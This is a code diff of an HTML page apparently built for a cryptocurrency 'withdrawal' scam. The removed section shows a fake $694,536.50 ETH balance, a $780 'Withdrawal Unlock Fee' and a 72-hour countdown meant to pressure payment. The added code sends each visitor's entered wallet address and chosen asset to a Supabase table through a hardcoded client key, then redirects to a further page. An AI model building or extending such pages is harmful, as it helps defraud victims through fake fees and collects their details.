@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto to Bank Transfer - Proceed</title>
+    <title>Crypto to Bank Transfer - Select Asset</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
             margin: 0;
@@ -32,14 +33,6 @@
             text-align: center;
             position: relative; 
             overflow: hidden;
-        }
-
-        .step {
-            display: none;
-        }
-
-        .step.active {
-            display: block;
         }
 
         h2 {
@@ -109,39 +102,6 @@
             line-height: 1.4;
         }
 
-        .summary-box {
-            background-color: #0f172a;
-            padding: 20px;
-            border-radius: 8px;
-            text-align: left;
-            margin-bottom: 20px;
-            border: 1px solid #334155;
-        }
-
-        .summary-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 12px;
-            font-size: 15px;
-        }
-
-        .summary-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .highlight {
-            color: #34d399;
-            font-weight: 600;
-        }
-
-        .timer {
-            font-size: 28px;
-            font-weight: 700;
-            color: #ef4444;
-            margin: 20px 0;
-            letter-spacing: 1px;
-        }
-
         .spinner-overlay {
             visibility: hidden;        
             opacity: 0;
@@ -197,7 +157,7 @@
         <div class="spinner-text" id="spinner-message">Processing...</div>
     </div>
 
-    <div class="step active" id="step2">
+    <div>
         <h2>Select Asset</h2>
         <p>Choose the cryptocurrency you want to withdraw and provide your wallet address.</p>
         
@@ -217,34 +177,16 @@
         <button class="btn" onclick="processStep2()">Next</button>
     </div>
 
-    <div class="step" id="step3">
-        <h2>Payment Details</h2>
-        <p>Review the transaction details and complete the required network fee payment before the timer expires.</p>
-        
-        <div class="summary-box">
-            <div class="summary-item">
-                <span>Selected Crypto:</span>
-                <span id="display-crypto" class="highlight">-</span>
-            </div>
-            <div class="summary-item">
-                <span>Crypto Value:</span>
-                <span class="highlight">$694,536.50 (202.48 ETH)</span>
-            </div>
-            <div class="summary-item">
-                <span>Withdrawal Unlock Fee:</span>
-                <span style="color: #ef4444; font-weight: 600;">$780.00</span>
-            </div>
-        </div>
-
-        <p style="margin-bottom: 5px;">Time remaining to complete payment:</p>
-        <div class="timer" id="countdown">72:00:00</div>
-
-        <button class="btn" style="background-color: #10b981;" onclick="triggerPaymentProcessing()">Pay Now</button>
-    </div>
-
 </div>
 
 <script>
+    // Supabase Configuration
+    const SUPABASE_URL = "https://kmjmqrrmzdtovovzigxk.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb";
+    
+    // Initialize Supabase Client
+    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
     const REQUIRED_ADDRESS = "0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8";
 
     function showSpinner(text, duration, callback) {
@@ -272,14 +214,7 @@
         errorBox.innerText = '';
     }
 
-    function toggleInternalStep(stepNumber) {
-        document.querySelectorAll('.step').forEach(step => {
-            step.classList.remove('active');
-        });
-        document.getElementById('step' + stepNumber).classList.add('active');
-    }
-
-    function processStep2() {
+    async function processStep2() {
         const address = document.getElementById('wallet-address').value.trim();
         const selectedCrypto = document.getElementById('crypto-select').value;
 
@@ -298,43 +233,32 @@
             return;
         }
 
-        document.getElementById('display-crypto').innerText = selectedCrypto;
+        // Show spinner during network submission
+        const spinner = document.getElementById('loading-spinner');
+        document.getElementById('spinner-message').innerText = "Verifying network configurations...";
+        spinner.classList.add('active');
 
-        showSpinner("Verifying network configurations...", 1800, () => {
-            toggleInternalStep(3);
-            startTimer(259200); // 72 Hours running natively inside page 2
-        });
-    }
+        try {
+            // Write data directly into Supabase Table
+            const { data, error } = await supabase
+                .from('crypto_transfers')
+                .insert([
+                    { wallet_address: address, crypto_asset: selectedCrypto }
+                ]);
 
-    function triggerPaymentProcessing() {
-        showSpinner("Initiating secure payment protocol...", 2000, () => {
-            console.log('Payment processing initiated!');
-        });
-    }
+            if (error) throw error;
 
-    function startTimer(duration) {
-        let timer = duration, hours, minutes, seconds;
-        const display = document.getElementById('countdown');
-        
-        if(window.timerInterval) clearInterval(window.timerInterval);
+            // Enforce minimum UI loading state duration before moving pages
+            setTimeout(() => {
+                spinner.classList.remove('active');
+                window.location.href = "next.html";
+            }, 1800);
 
-        window.timerInterval = setInterval(function () {
-            hours = parseInt(timer / 3600, 10);
-            minutes = parseInt((timer % 3600) / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-
-            hours = hours < 10 ? "0" + hours : hours;
-            minutes = minutes < 10 ? "0" + minutes : minutes;
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-
-            display.textContent = hours + ":" + minutes + ":" + seconds;
-
-            if (--timer < 0) {
-                clearInterval(window.timerInterval);
-                display.textContent = "EXPIRED";
-                showError("Time has expired! Please restart the transaction.");
-            }
-        }, 1000);
+        } catch (err) {
+            spinner.classList.remove('active');
+            showError("Database Connection Error: Could not log transaction properties.");
+            console.error(err);
+        }
     }
 </script>
 
